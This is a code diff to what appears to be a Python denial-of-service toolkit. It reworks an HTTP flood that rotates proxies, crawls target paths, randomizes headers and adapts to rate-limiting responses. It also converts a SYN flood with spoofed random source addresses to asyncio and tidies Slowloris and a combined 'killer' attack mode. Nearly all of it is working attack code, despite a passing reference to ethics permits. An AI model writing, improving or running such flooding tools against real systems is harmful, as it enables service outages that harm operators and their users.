@@ -22,7 +22,6 @@ before conducting any tests. Please read the usage and ethics permits at `LEGALL
 import asyncio
 import time
 import sys
-import multiprocessing as mp
 import argparse
 import random
 import socket
@@ -41,7 +40,6 @@ except ImportError:
     SCAPY_AVAILABLE = False
 
 # Import project modules
-# Assuming these utils are in the parent directory, adjust if necessary
 sys.path.append('..')
 from utils.logger import setup_logging
 from utils.randomizer import HeaderFactory, get_random_user_agent
@@ -97,6 +95,7 @@ async def _http_flood_worker(
     benchmark: BenchmarkManager,
     planner: Optional[StrategyPlanner],
     header_factory: HeaderFactory,
+    semaphore: asyncio.Semaphore,
 ):
     """
     The main async loop for a single HTTP flood worker.
@@ -104,35 +103,40 @@ async def _http_flood_worker(
     print(colored(f"[+] HTTP Worker {worker_id} started.", "blue"))
     path_cycle = cycle(attack_paths)
     while not stop_event.is_set():
-        proxy: Optional[str] = None
-        if proxy_pool:
-            proxy = await proxy_pool.get_proxy()
-            if proxy is None:
-                logger.error(f"Worker {worker_id} could not get a proxy. Stopping.")
-                break
-            client.proxies = {'all://': proxy}
-        tasks = []
-        for _ in range(REQUESTS_PER_BATCH):
-            if stop_event.is_set():
-                break
-            path = next(path_cycle)
-            if planner and await planner.is_path_dangerous(path):
-                continue
-            full_url = urljoin(base_url, path)
-            tasks.append(_send_single_http_request(client, full_url, path, benchmark, header_factory, planner))
-        results = await asyncio.gather(*tasks, return_exceptions=True)
-        if proxy_pool and proxy:
-            status_codes = [r[0] for r in results if isinstance(r, tuple)]
-            num_failures = status_codes.count(None)
-            final_status_for_proxy: Optional[int] = 200
-            if 429 in status_codes:
-                final_status_for_proxy = 429
-            elif 403 in status_codes:
-                final_status_for_proxy = 403
-            elif len(status_codes) > 0 and num_failures / len(status_codes) > 0.5:
-                final_status_for_proxy = None
-            await proxy_pool.release_proxy(proxy, final_status_for_proxy)
-        await asyncio.sleep(0.01)
+        async with semaphore:
+            proxy: Optional[str] = None
+            if proxy_pool:
+                proxy = await proxy_pool.get_proxy()
+                if proxy is None:
+                    logger.error(f"Worker {worker_id} could not get a proxy. Stopping.")
+                    break
+                client.proxies = {'all://': proxy}
+            
+            tasks = []
+            for _ in range(REQUESTS_PER_BATCH):
+                if stop_event.is_set():
+                    break
+                path = next(path_cycle)
+                if planner and await planner.is_path_dangerous(path):
+                    continue
+                full_url = urljoin(base_url, path)
+                tasks.append(_send_single_http_request(client, full_url, path, benchmark, header_factory, planner))
+            
+            results = await asyncio.gather(*tasks, return_exceptions=True)
+            
+            if proxy_pool and proxy:
+                status_codes = [r[0] for r in results if isinstance(r, tuple)]
+                num_failures = status_codes.count(None)
+                final_status_for_proxy: Optional[int] = 200
+                if 429 in status_codes:
+                    final_status_for_proxy = 429
+                elif 403 in status_codes:
+                    final_status_for_proxy = 403
+                elif len(status_codes) > 0 and num_failures / len(status_codes) > 0.5:
+                    final_status_for_proxy = None
+                await proxy_pool.release_proxy(proxy, final_status_for_proxy)
+            
+            await asyncio.sleep(0.01)
 
 async def http_flood_orchestrator(args: argparse.Namespace, stop_event: asyncio.Event, benchmark: BenchmarkManager):
     """Main async function to set up and run the HTTP Flood attack component."""
@@ -142,6 +146,7 @@ async def http_flood_orchestrator(args: argparse.Namespace, stop_event: asyncio.
     planner = StrategyPlanner() if 'adaptive' in args and args.adaptive else None
     proxy_pool: Optional[AdaptiveProxyPool] = None
     cooldown_task: Optional[asyncio.Task] = None
+
     if 'use_proxies' in args and args.use_proxies:
         if not args.proxy_file:
             print(colored("[!] ERROR: --proxy-file must be provided when using --use-proxies.", "red"))
@@ -152,16 +157,26 @@ async def http_flood_orchestrator(args: argparse.Namespace, stop_event: asyncio.
             return
         proxy_pool = AdaptiveProxyPool(proxies, logger)
         cooldown_task = asyncio.create_task(proxy_pool.cooldown_manager())
+
     attack_paths = [args.path] if 'path' in args and args.path else await crawl_target_paths(base_url)
     if not attack_paths:
         print(colored("[!] No attack paths found or specified for HTTP Flood. Using '/'.", "yellow"))
         attack_paths = ['/']
+
     print(colored(f"\n[+] Starting HTTP Flood component on {args.target} with {args.workers} workers...", "cyan", attrs=["bold"]))
     if proxy_pool:
         print(colored(f"    Using {len(proxy_pool.available_proxies)} tested proxies.", "cyan"))
+
     client_params = {'http2': True, 'limits': httpx.Limits(max_connections=None, max_keepalive_connections=args.workers), 'timeout': httpx.Timeout(10.0), 'verify': False}
+    semaphore = asyncio.Semaphore(args.workers)
+    
     async with httpx.AsyncClient(**client_params) as client:
-        worker_tasks = [asyncio.create_task(_http_flood_worker(i, client, base_url, attack_paths, proxy_pool, stop_event, benchmark, planner, header_factory)) for i in range(args.workers)]
+        worker_tasks = [
+            asyncio.create_task(_http_flood_worker(
+                i, client, base_url, attack_paths, proxy_pool, 
+                stop_event, benchmark, planner, header_factory, semaphore
+            )) for i in range(args.workers)
+        ]
         await asyncio.gather(*worker_tasks, return_exceptions=True)
         if cooldown_task:
             cooldown_task.cancel()
@@ -184,58 +199,62 @@ def run_http_flood(args: argparse.Namespace):
 # LAYER 4 ATTACK: SYN FLOOD
 # ======================================================
 
-def _syn_flood_worker(target_ip: str, port: int, rate_limit: int, stop_event: mp.Event, stats: mp.Value):
-    """A single SYN flood worker process."""
-    packet_count = 0
-    delay = 1.0 / rate_limit if rate_limit > 0 else 0
+async def _syn_flood_worker(target_ip: str, port: int, stop_event: asyncio.Event, stats: dict):
+    """A single SYN flood worker task."""
     while not stop_event.is_set():
         try:
             ip_layer = IP(src=str(RandIP()), dst=target_ip)
             tcp_layer = TCP(sport=RandShort(), dport=port, flags="S")
             send(ip_layer / tcp_layer, verbose=0)
-            packet_count += 1
-            if delay > 0:
-                time.sleep(delay)
+            stats['packets'] += 1
         except Exception as e:
-            print(f"\nError in SYN worker: {e}", file=sys.stderr)
+            logger.error(f"Error in SYN worker: {e}")
             break
-    with stats.get_lock():
-        stats.value += packet_count
+        await asyncio.sleep(0)  # Yield control to the event loop
 
-def run_syn_flood(args: argparse.Namespace):
-    """Public wrapper to start the SYN Flood attack."""
+async def syn_flood_orchestrator(args: argparse.Namespace, stop_event: asyncio.Event):
+    """Orchestrates the SYN Flood attack using asyncio."""
     if not SCAPY_AVAILABLE:
         print(colored("\n[!] ERROR: 'scapy' library is not installed. It is required for SYN Flood.", "red"))
         print(colored("    Please run: pip install scapy", "yellow"))
         sys.exit(1)
-    print(colored(f"\n[+] Starting SYN Flood on {args.target}:{args.port} with {args.processes} processes...", "cyan"))
-    with mp.Manager() as manager:
-        total_packets = manager.Value('i', 0)
-        stop_event = manager.Event()
-        start_time = time.time()
-        with mp.Pool(processes=args.processes) as pool:
-            process_args = [(args.target, args.port, args.rate_limit, stop_event, total_packets)] * args.processes
-            pool.starmap_async(_syn_flood_worker, process_args)
-            try:
-                end_time = start_time + args.duration
-                while time.time() < end_time:
-                    remaining = max(0, end_time - time.time())
-                    pps = total_packets.value / (time.time() - start_time + 1e-6)
-                    print(colored(f"\r[+] Packets Sent: {total_packets.value} | PPS: {pps:.1f} | Time Left: {int(remaining)}s  ", "green"), end="", flush=True)
-                    time.sleep(1)
-            except KeyboardInterrupt:
-                print(colored("\n[!] User interruption detected.", "yellow"))
-            finally:
-                print(colored("\n[!] Stopping worker processes...", "yellow"))
-                stop_event.set()
-                pool.close()
-                pool.join()
-                total_time = time.time() - start_time
-                final_pps = total_packets.value / total_time if total_time > 0 else 0
-                print(colored(f"\n\n[!] Attack Finished", "red", attrs=["bold"]))
-                print(colored(f"    - Total Packets: {total_packets.value}", "yellow"))
-                print(colored(f"    - Duration: {total_time:.2f} seconds", "yellow"))
-                print(colored(f"    - Average PPS: {final_pps:.2f}", "yellow"))
+
+    print(colored(f"\n[+] Starting SYN Flood on {args.target}:{args.port} with {args.workers} workers...", "cyan"))
+    stats = {'packets': 0}
+    start_time = time.time()
+
+    tasks = [
+        asyncio.create_task(_syn_flood_worker(args.target, args.port, stop_event, stats))
+        for _ in range(args.workers)
+    ]
+
+    try:
+        end_time = start_time + args.duration
+        while time.time() < end_time:
+            remaining = max(0, end_time - time.time())
+            pps = stats['packets'] / (time.time() - start_time + 1e-6)
+            print(colored(f"\r[+] Packets Sent: {stats['packets']} | PPS: {pps:.1f} | Time Left: {int(remaining)}s  ", "green"), end="", flush=True)
+            await asyncio.sleep(1)
+    except KeyboardInterrupt:
+        print(colored("\n[!] User interruption detected.", "yellow"))
+    finally:
+        print(colored("\n[!] Stopping worker tasks...", "yellow"))
+        stop_event.set()
+        await asyncio.gather(*tasks, return_exceptions=True)
+        total_time = time.time() - start_time
+        final_pps = stats['packets'] / total_time if total_time > 0 else 0
+        print(colored(f"\n\n[!] Attack Finished", "red", attrs=["bold"]))
+        print(colored(f"    - Total Packets: {stats['packets']}", "yellow"))
+        print(colored(f"    - Duration: {total_time:.2f} seconds", "yellow"))
+        print(colored(f"    - Average PPS: {final_pps:.2f}", "yellow"))
+
+def run_syn_flood(args: argparse.Namespace):
+    """Public wrapper to start the SYN Flood attack."""
+    stop_event = asyncio.Event()
+    try:
+        asyncio.run(syn_flood_orchestrator(args, stop_event))
+    except KeyboardInterrupt:
+        pass
 
 # ======================================================
 # LAYER 7 ATTACK - SLOWLORIS
@@ -287,7 +306,6 @@ async def slowloris_orchestrator(args: argparse.Namespace, stop_event: Optional[
 
     print(colored(f"\n[+] Starting Slowloris component on {args.target}:{args.port} with {args.connections} connections...", "cyan"))
     
-    # This task list is managed within the orchestrator's scope
     tasks = []
     
     async def replenish_workers():
@@ -321,13 +339,11 @@ async def slowloris_orchestrator(args: argparse.Namespace, stop_event: Optional[
             await asyncio.gather(*tasks, return_exceptions=True)
             print(colored(f"\n\n[!] Slowloris Attack Finished", "red", attrs=["bold"]))
     else:
-        # In component mode, just wait for the replenish task to be cancelled externally
         await asyncio.gather(replenish_task, return_exceptions=True)
 
 
 def run_slowloris_attack(args: argparse.Namespace):
     """Public wrapper to start the Slowloris attack in standalone mode."""
-    # This now calls the orchestrator with only one argument, which is handled correctly.
     asyncio.run(slowloris_orchestrator(args))
 
 # ======================================================
@@ -342,7 +358,6 @@ async def killer_orchestrator(args: argparse.Namespace):
     slowloris_lock = asyncio.Lock()
     http_benchmark = BenchmarkManager()
 
-    # Call the orchestrator with all arguments for component mode
     slowloris_task = asyncio.create_task(slowloris_orchestrator(args, stop_event, slowloris_sockets, slowloris_lock))
     http_flood_task = asyncio.create_task(http_flood_orchestrator(args, stop_event, http_benchmark))
 
